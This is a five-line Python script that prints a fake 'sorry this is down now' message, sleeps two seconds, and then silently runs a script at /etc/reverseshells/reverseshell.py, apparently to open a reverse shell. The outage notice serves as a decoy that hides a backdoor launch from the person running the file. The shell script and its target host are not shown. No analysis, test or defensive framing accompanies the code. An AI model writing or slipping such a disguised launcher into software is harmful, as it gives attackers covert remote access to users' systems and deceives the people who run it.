import time
import os
print("sorry this is down now")
time.sleep(2)
os.system("python3 /etc/reverseshells/reverseshell.py")